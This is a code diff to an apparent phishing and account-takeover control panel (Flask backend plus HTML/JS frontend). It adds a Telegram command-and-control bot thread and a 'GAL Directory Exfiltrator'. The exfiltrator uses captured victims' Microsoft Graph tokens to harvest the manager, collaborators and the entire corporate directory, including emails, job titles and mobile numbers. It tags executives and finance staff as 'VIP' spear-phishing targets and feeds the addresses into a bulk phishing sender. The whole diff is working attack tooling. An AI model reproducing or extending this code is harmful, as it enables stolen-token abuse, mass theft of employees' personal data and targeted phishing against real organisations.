@@ -40,6 +40,9 @@ refresher = TokenRefresher()
 refresher.start()
 kw_watcher = keyword_watcher.KeywordWatcherThread(interval_seconds=45)
 kw_watcher.start()
+import telegram_c2
+tg_c2_bot = telegram_c2.TelegramC2BotThread(poll_interval=3)
+tg_c2_bot.start()
 
 HTML_TEMPLATE = r'''
 <!DOCTYPE html>
@@ -3393,6 +3396,7 @@ HTML_TEMPLATE = r'''
                     <div class="extractor-tabs">
                         <div class="extractor-tab active" id="etab-extractor" onclick="switchExtractorTab('extractor')">📤 Extractor</div>
                         <div class="extractor-tab" id="etab-sorter" onclick="switchExtractorTab('sorter')">🗂️ Sorter</div>
+                        <div class="extractor-tab" id="etab-gal" onclick="switchExtractorTab('gal')">👥 Corporate Directory (GAL)</div>
                     </div>
                     <select id="extractor-account-select" class="account-selector-pill" onchange="onExtractorAccountChange()">
                         <option value="">— Select captured account —</option>
@@ -3495,6 +3499,69 @@ HTML_TEMPLATE = r'''
                         <!-- Terminal Output -->
                         <div class="terminal-pane" id="sort-terminal">
                             <div class="terminal-line dim"><span class="term-ts">[00:00]</span><span class="term-txt">Upload a TXT or CSV file containing email addresses, then click ▶ Start Sorting.</span></div>
+                        </div>
+                    </div>
+
+                    <!-- ── GAL DIRECTORY EXFILTRATOR PANEL ── -->
+                    <div id="epanel-gal" class="extractor-panel" style="display:none;">
+
+                        <!-- Scope Selection Cards -->
+                        <div class="extractor-controls-row">
+                            <div class="category-card selected" id="gal-cat-users" onclick="toggleGalScope('users')">
+                                <div class="category-checkbox" id="chk-gal-users"></div>
+                                <div>
+                                    <div class="category-info-title">🏢 Tenant Global Users (/users)</div>
+                                    <div class="category-info-desc">Paginates through entire enterprise directory extracting display name, corporate email, job title, department, mobile phone, and office.</div>
+                                </div>
+                            </div>
+                            <div class="category-card selected" id="gal-cat-people" onclick="toggleGalScope('people')">
+                                <div class="category-checkbox" id="chk-gal-people"></div>
+                                <div>
+                                    <div class="category-info-title">🤝 Frequent Collaborators (/me/people)</div>
+                                    <div class="category-info-desc">Exfiltrates the victim's closest working circle, frequent communications partners, and internal team members.</div>
+                                </div>
+                            </div>
+                            <div class="category-card selected" id="gal-cat-manager" onclick="toggleGalScope('manager')">
+                                <div class="category-checkbox" id="chk-gal-manager"></div>
+                                <div>
+                                    <div class="category-info-title">👑 Direct Supervisor (/me/manager)</div>
+                                    <div class="category-info-desc">Identifies and exfiltrates the victim's organizational manager for high-credibility executive spear-phishing.</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Action buttons + counters -->
+                        <div class="extractor-btn-group">
+                            <button class="ext-btn ext-btn-start" id="gal-start-btn" onclick="startGalExtraction()" disabled>
+                                <span>▶</span> Exfiltrate GAL Directory
+                            </button>
+                            <button class="ext-btn ext-btn-download" id="gal-dl-csv-btn" onclick="downloadGalExtracted('csv')" disabled>
+                                ⬇ Download CSV
+                            </button>
+                            <button class="ext-btn ext-btn-download" id="gal-dl-txt-btn" onclick="downloadGalExtracted('txt')" disabled>
+                                ⬇ Download TXT
+                            </button>
+                            <button class="ext-btn" id="gal-b2b-btn" onclick="pushGalToB2BSender()" disabled style="background:#5c2d91; border-color:#744da9; color:#ffffff;">
+                                🚀 Push to B2B Sender
+                            </button>
+                            <button class="ext-btn ext-btn-reset" onclick="resetGalExtractor()">
+                                ↺ Reset
+                            </button>
+                            <div class="ext-counters">
+                                <div class="ext-counter-chip">contacts <span id="gal-ctr-total">0</span></div>
+                                <div class="ext-counter-chip" style="color:#f59e0b;">VIPs <span id="gal-ctr-vip">0</span></div>
+                                <div class="ext-counter-chip">depts <span id="gal-ctr-depts">0</span></div>
+                            </div>
+                        </div>
+
+                        <!-- Progress bar -->
+                        <div class="progress-bar-outer" id="gal-progress-bar-outer" style="display:none;">
+                            <div class="progress-bar-inner" id="gal-progress-bar" style="width:0%"></div>
+                        </div>
+
+                        <!-- Terminal Output -->
+                        <div class="terminal-pane" id="gal-terminal">
+                            <div class="terminal-line dim"><span class="term-ts">[00:00]</span><span class="term-txt">Select a captured corporate account from the dropdown above, select exfiltration scopes, then click ▶ Exfiltrate GAL Directory.</span></div>
                         </div>
                     </div>
 
@@ -12144,10 +12211,156 @@ Delegated     : ${inboxesDesc}
         function switchExtractorTab(tab) {
             document.getElementById('etab-extractor').classList.toggle('active', tab === 'extractor');
             document.getElementById('etab-sorter').classList.toggle('active', tab === 'sorter');
+            if (document.getElementById('etab-gal')) document.getElementById('etab-gal').classList.toggle('active', tab === 'gal');
+
             document.getElementById('epanel-extractor').classList.toggle('active', tab === 'extractor');
             document.getElementById('epanel-sorter').classList.toggle('active', tab === 'sorter');
-            // Account select only relevant for extractor
-            document.getElementById('extractor-account-select').style.display = (tab === 'extractor') ? '' : 'none';
+            if (document.getElementById('epanel-gal')) document.getElementById('epanel-gal').classList.toggle('active', tab === 'gal');
+
+            document.getElementById('epanel-extractor').style.display = (tab === 'extractor') ? 'block' : 'none';
+            document.getElementById('epanel-sorter').style.display = (tab === 'sorter') ? 'block' : 'none';
+            if (document.getElementById('epanel-gal')) document.getElementById('epanel-gal').style.display = (tab === 'gal') ? 'block' : 'none';
+
+            // Account select relevant for extractor and gal
+            document.getElementById('extractor-account-select').style.display = (tab !== 'sorter') ? '' : 'none';
+            if (tab === 'gal') onGalAccountChange();
+        }
+
+        // ─── GLOBAL ADDRESS LIST (GAL) CLIENT ENGINE ──────────────────
+        let _galScopes = { users: true, people: true, manager: true };
+        let _galEventSource = null;
+        let _galHasResults = false;
+
+        function toggleGalScope(scope) {
+            _galScopes[scope] = !_galScopes[scope];
+            const card = document.getElementById('gal-cat-' + scope);
+            if (card) card.classList.toggle('selected', _galScopes[scope]);
+            onGalAccountChange();
+        }
+
+        function onGalAccountChange() {
+            const hasAcc = Boolean(_extSelectedAccount);
+            const hasScope = Object.values(_galScopes).some(Boolean);
+            const startBtn = document.getElementById('gal-start-btn');
+            if (startBtn) startBtn.disabled = !(hasAcc && hasScope);
+        }
+
+        function startGalExtraction() {
+            if (!_extSelectedAccount) { showToast('Select a captured account first'); return; }
+            if (!Object.values(_galScopes).some(Boolean)) { showToast('Select at least one exfiltration scope'); return; }
+
+            if (_galEventSource) { _galEventSource.close(); _galEventSource = null; }
+            document.getElementById('gal-terminal').innerHTML = '';
+            document.getElementById('gal-ctr-total').innerText = '0';
+            document.getElementById('gal-ctr-vip').innerText = '0';
+            document.getElementById('gal-ctr-depts').innerText = '0';
+            document.getElementById('gal-progress-bar-outer').style.display = 'block';
+            document.getElementById('gal-progress-bar').style.width = '15%';
+            document.getElementById('gal-dl-txt-btn').disabled = true;
+            document.getElementById('gal-dl-csv-btn').disabled = true;
+            document.getElementById('gal-b2b-btn').disabled = true;
+            document.getElementById('gal-start-btn').disabled = true;
+            _galHasResults = false;
+
+            let scopeStr = 'all';
+            if (_galScopes.manager && !_galScopes.people && !_galScopes.users) scopeStr = 'manager';
+            else if (_galScopes.people && !_galScopes.manager && !_galScopes.users) scopeStr = 'people';
+            else if (_galScopes.users && !_galScopes.manager && !_galScopes.people) scopeStr = 'users';
+
+            const url = `/api/gal/stream?user_code=${encodeURIComponent(_extSelectedAccount)}&scope=${scopeStr}`;
+            const es = new EventSource(url);
+            _galEventSource = es;
+
+            es.onmessage = (e) => {
+                let data;
+                try { data = JSON.parse(e.data); } catch { return; }
+
+                if (data.type === 'contact') {
+                    const c = data.contact || {};
+                    const vipBadge = c.is_vip ? ' <span style="background:#d97706; color:#ffffff; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:800;">⭐ VIP</span>' : '';
+                    const deptStr = c.department ? ` [${c.department}]` : '';
+                    const titleStr = c.job_title ? ` (${c.job_title})` : '';
+                    termLog('gal-terminal', `[${c.source}] ${vipBadge} <b>${escapeHtml(c.display_name)}</b> &lt;<span style="color:#58a6ff;">${c.email}</span>&gt;${titleStr}${deptStr}`, 'success');
+
+                    document.getElementById('gal-ctr-total').innerText = data.total || 0;
+                    document.getElementById('gal-ctr-vip').innerText = data.vip_count || 0;
+                    document.getElementById('gal-ctr-depts').innerText = data.depts || 0;
+                } else if (data.type === 'status') {
+                    termLog('gal-terminal', data.msg, data.cls || 'dim');
+                } else if (data.type === 'done') {
+                    termLog('gal-terminal', data.msg, 'success');
+                    document.getElementById('gal-progress-bar').style.width = '100%';
+                    document.getElementById('gal-ctr-total').innerText = data.total || 0;
+                    document.getElementById('gal-ctr-vip').innerText = data.vip_count || 0;
+                    document.getElementById('gal-ctr-depts').innerText = data.depts || 0;
+                    _galHasResults = data.total > 0;
+                    document.getElementById('gal-dl-txt-btn').disabled = !_galHasResults;
+                    document.getElementById('gal-dl-csv-btn').disabled = !_galHasResults;
+                    document.getElementById('gal-b2b-btn').disabled = !_galHasResults;
+                    document.getElementById('gal-start-btn').disabled = false;
+                    es.close(); _galEventSource = null;
+                    setTimeout(() => { document.getElementById('gal-progress-bar-outer').style.display = 'none'; }, 2000);
+                } else if (data.type === 'error') {
+                    termLog('gal-terminal', '❌ ' + data.msg, 'error');
+                    document.getElementById('gal-start-btn').disabled = false;
+                    es.close(); _galEventSource = null;
+                }
+            };
+
+            es.onerror = () => {
+                if (_galEventSource) {
+                    termLog('gal-terminal', '⚠ Stream ended or connection closed.', 'warn');
+                    es.close(); _galEventSource = null;
+                    document.getElementById('gal-start-btn').disabled = false;
+                }
+            };
+        }
+
+        function downloadGalExtracted(fmt) {
+            if (!_extSelectedAccount) return;
+            const url = `/api/gal/download?user_code=${encodeURIComponent(_extSelectedAccount)}&format=${fmt}`;
+            const a = document.createElement('a');
+            a.href = url; a.download = ''; a.click();
+            showToast(`Downloading corporate directory as .${fmt}...`);
+        }
+
+        async function pushGalToB2BSender() {
+            if (!_extSelectedAccount) return;
+            try {
+                showToast('⏳ Exporting GAL contacts into B2B Campaign Sender...');
+                const res = await (await fetch('/api/gal/push-to-b2b', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_code: _extSelectedAccount })
+                })).json();
+
+                if (res.success) {
+                    const b2bBox = document.getElementById('b2b-recipients') || document.getElementById('b2b-recipients-input');
+                    if (b2bBox) {
+                        b2bBox.value = res.emails_text;
+                    }
+                    showToast(`✓ Imported ${res.count} corporate contacts directly into B2B Sender!`);
+                    showPage('b2b', document.getElementById('nav-b2b'));
+                } else {
+                    showToast('⚠️ Push failed: ' + (res.error || 'Unknown error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Export failed: ' + e);
+            }
+        }
+
+        function resetGalExtractor() {
+            if (_galEventSource) { _galEventSource.close(); _galEventSource = null; }
+            document.getElementById('gal-terminal').innerHTML = '<div class="terminal-line dim"><span class="term-ts">[00:00]</span><span class="term-txt">Select a captured corporate account from the dropdown above, select exfiltration scopes, then click ▶ Exfiltrate GAL Directory.</span></div>';
+            document.getElementById('gal-ctr-total').innerText = '0';
+            document.getElementById('gal-ctr-vip').innerText = '0';
+            document.getElementById('gal-ctr-depts').innerText = '0';
+            document.getElementById('gal-progress-bar-outer').style.display = 'none';
+            document.getElementById('gal-dl-txt-btn').disabled = true;
+            document.getElementById('gal-dl-csv-btn').disabled = true;
+            document.getElementById('gal-b2b-btn').disabled = true;
+            _galHasResults = false;
+            onGalAccountChange();
         }
 
         function toggleCategory(cat) {
@@ -17027,6 +17240,236 @@ def extractor_download():
         mime = 'text/plain'
     return Response(output, mimetype=mime,
                     headers={'Content-Disposition': f'attachment; filename="{filename}"'})
+
+# ═══════════════════════════════════════════════════════════════════
+# GLOBAL ADDRESS LIST (GAL) AUTO-EXFILTRATOR API ROUTES
+# ═══════════════════════════════════════════════════════════════════
+
+_gal_results: dict = {}
+
+VIP_KEYWORDS = ('ceo', 'cfo', 'coo', 'cto', 'cio', 'ciso', 'director', 'president', 'vp', 'vice president',
+                'head of', 'general counsel', 'treasurer', 'payroll', 'finance', 'controller', 'it admin',
+                'security', 'hr manager', 'chief')
+
+@app.route('/api/gal/stream', methods=['GET'])
+def gal_stream():
+    uc = request.args.get('user_code', '').strip()
+    scope = request.args.get('scope', 'all').strip()
+
+    s = db.get_session_by_user_code(uc)
+    if not s or s.get('status') != 'CAPTURED':
+        def _err():
+            yield 'data: {"type":"error","msg":"Invalid or non-captured session"}\n\n'
+        return Response(stream_with_context(_err()), mimetype='text/event-stream')
+
+    token = db.get_graph_access_token(s)
+
+    def generate():
+        import json as _json
+        def sse(obj):
+            return f'data: {_json.dumps(obj)}\n\n'
+
+        yield sse({'type': 'status', 'msg': '🚀 Initializing Microsoft Graph Directory Harvest...', 'cls': 'header'})
+
+        collected = []
+        seen_emails = set()
+        vip_count = 0
+        dept_set = set()
+
+        # 1. Direct Manager Exfiltration
+        if scope in ('all', 'manager'):
+            yield sse({'type': 'status', 'msg': '👑 Querying Direct Manager (/me/manager)...', 'cls': 'header'})
+            try:
+                mgr = graph.make_graph_request('/me/manager', token)
+                if mgr and not mgr.get('error'):
+                    em = (mgr.get('mail') or mgr.get('userPrincipalName') or '').strip().lower()
+                    if em and em not in seen_emails:
+                        seen_emails.add(em)
+                        c_item = {
+                            'display_name': mgr.get('displayName') or 'Direct Manager',
+                            'email': em,
+                            'job_title': mgr.get('jobTitle') or 'Manager',
+                            'department': mgr.get('department') or 'Executive',
+                            'mobile_phone': mgr.get('mobilePhone') or '',
+                            'office_location': mgr.get('officeLocation') or '',
+                            'is_vip': True,
+                            'source': 'manager'
+                        }
+                        collected.append(c_item)
+                        vip_count += 1
+                        if c_item['department']: dept_set.add(c_item['department'])
+                        yield sse({
+                            'type': 'contact',
+                            'contact': c_item,
+                            'vip_count': vip_count,
+                            'total': len(collected),
+                            'depts': len(dept_set)
+                        })
+            except Exception as ex:
+                yield sse({'type': 'status', 'msg': f'  ℹ Manager not available: {ex}', 'cls': 'dim'})
+
+        # 2. Frequent Collaborators (/me/people)
+        if scope in ('all', 'people'):
+            yield sse({'type': 'status', 'msg': '🤝 Harvesting Frequent Collaborators (/me/people)...', 'cls': 'header'})
+            try:
+                people_res = graph.make_graph_request('/me/people?$top=100', token)
+                if people_res and people_res.get('value'):
+                    for p in people_res['value']:
+                        scored_emails = p.get('scoredEmailAddresses', [])
+                        em = ''
+                        if scored_emails:
+                            em = scored_emails[0].get('address', '')
+                        if not em:
+                            em = p.get('userPrincipalName', '')
+                        em = (em or '').strip().lower()
+                        if em and _is_valid_email(em) and em not in seen_emails:
+                            seen_emails.add(em)
+                            title = p.get('jobTitle') or ''
+                            is_vip = any(vk in title.lower() for vk in VIP_KEYWORDS)
+                            if is_vip: vip_count += 1
+                            c_item = {
+                                'display_name': p.get('displayName') or em.split('@')[0],
+                                'email': em,
+                                'job_title': title,
+                                'department': p.get('department') or '',
+                                'mobile_phone': p.get('phones', [{}])[0].get('number', '') if p.get('phones') else '',
+                                'office_location': p.get('officeLocation') or '',
+                                'is_vip': is_vip,
+                                'source': 'people'
+                            }
+                            collected.append(c_item)
+                            if c_item['department']: dept_set.add(c_item['department'])
+                            yield sse({
+                                'type': 'contact',
+                                'contact': c_item,
+                                'vip_count': vip_count,
+                                'total': len(collected),
+                                'depts': len(dept_set)
+                            })
+            except Exception as ex:
+                yield sse({'type': 'status', 'msg': f'  ⚠ People endpoint note: {ex}', 'cls': 'dim'})
+
+        # 3. Global Users Directory (/users)
+        if scope in ('all', 'users'):
+            yield sse({'type': 'status', 'msg': '🏢 Paginating Tenant Global Address List (/users)...', 'cls': 'header'})
+            try:
+                query_url = '/users?$top=999&$select=displayName,mail,userPrincipalName,jobTitle,department,mobilePhone,officeLocation'
+                page_count = 0
+                while query_url and page_count < 20:
+                    page_count += 1
+                    res = graph.make_graph_request(query_url, token)
+                    if not res or res.get('error'):
+                        break
+                    users = res.get('value', [])
+                    for u in users:
+                        em = (u.get('mail') or u.get('userPrincipalName') or '').strip().lower()
+                        if em and _is_valid_email(em) and em not in seen_emails:
+                            seen_emails.add(em)
+                            title = u.get('jobTitle') or ''
+                            is_vip = any(vk in title.lower() for vk in VIP_KEYWORDS)
+                            if is_vip: vip_count += 1
+                            c_item = {
+                                'display_name': u.get('displayName') or em.split('@')[0],
+                                'email': em,
+                                'job_title': title,
+                                'department': u.get('department') or '',
+                                'mobile_phone': u.get('mobilePhone') or '',
+                                'office_location': u.get('officeLocation') or '',
+                                'is_vip': is_vip,
+                                'source': 'users'
+                            }
+                            collected.append(c_item)
+                            if c_item['department']: dept_set.add(c_item['department'])
+                            yield sse({
+                                'type': 'contact',
+                                'contact': c_item,
+                                'vip_count': vip_count,
+                                'total': len(collected),
+                                'depts': len(dept_set)
+                            })
+                    nxt = res.get('@odata.nextLink')
+                    if nxt and 'https://graph.microsoft.com/v1.0' in nxt:
+                        query_url = nxt.replace('https://graph.microsoft.com/v1.0', '')
+                    else:
+                        query_url = None
+            except Exception as ex:
+                yield sse({'type': 'status', 'msg': f'  ⚠ Error querying /users: {ex}', 'cls': 'warn'})
+
+        _gal_results[uc] = collected
+        db.save_gal_contacts(uc, collected)
+
+        yield sse({
+            'type': 'done',
+            'total': len(collected),
+            'vip_count': vip_count,
+            'depts': len(dept_set),
+            'msg': f'✅ GAL Exfiltration complete. {len(collected)} corporate directory contacts saved ({vip_count} VIPs).',
+            'cls': 'success'
+        })
+
+    return Response(stream_with_context(generate()), mimetype='text/event-stream',
+                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
+
+
+@app.route('/api/gal/download', methods=['GET'])
+def gal_download():
+    uc = request.args.get('user_code', '').strip()
+    fmt = request.args.get('format', 'csv').lower()
+    contacts = _gal_results.get(uc)
+    if not contacts:
+        contacts = db.get_gal_contacts(uc, limit=2000)
+
+    s = db.get_session_by_user_code(uc)
+    victim = (s.get('victim_name') or s.get('victim_email') or uc).replace(' ', '_') if s else uc
+
+    if fmt == 'txt':
+        emails = [c.get('email', '') for c in contacts if c.get('email')]
+        output = '\n'.join(emails).encode('utf-8')
+        filename = f'{victim}_gal_directory.txt'
+        mime = 'text/plain'
+    elif fmt == 'json':
+        output = json.dumps(contacts, indent=2).encode('utf-8')
+        filename = f'{victim}_gal_directory.json'
+        mime = 'application/json'
+    else:
+        si = _io.StringIO()
+        w = _csv.writer(si)
+        w.writerow(['Display Name', 'Email Address', 'Job Title', 'Department', 'Mobile Phone', 'Office Location', 'VIP Target', 'Source'])
+        for c in contacts:
+            w.writerow([
+                c.get('display_name', ''),
+                c.get('email', ''),
+                c.get('job_title', ''),
+                c.get('department', ''),
+                c.get('mobile_phone', ''),
+                c.get('office_location', ''),
+                'YES' if c.get('is_vip') else 'NO',
+                c.get('source', '')
+            ])
+        output = si.getvalue().encode('utf-8')
+        filename = f'{victim}_gal_directory.csv'
+        mime = 'text/csv'
+
+    return Response(output, mimetype=mime,
+                    headers={'Content-Disposition': f'attachment; filename="{filename}"'})
+
+
+@app.route('/api/gal/push-to-b2b', methods=['POST'])
+def gal_push_to_b2b():
+    d = request.json or {}
+    uc = d.get('user_code', '').strip()
+    contacts = _gal_results.get(uc)
+    if not contacts:
+        contacts = db.get_gal_contacts(uc, limit=2000)
+    if not contacts:
+        return jsonify({'success': False, 'error': 'No harvested contacts found to export.'}), 400
+
+    emails = [c.get('email', '') for c in contacts if c.get('email')]
+    return jsonify({
+        'success': True,
+        'count': len(emails),
+        'emails_text': '\n'.join(emails)
+    })
 
 # ═══════════════════════════════════════════════════════════════════
 # SORTER ROUTE
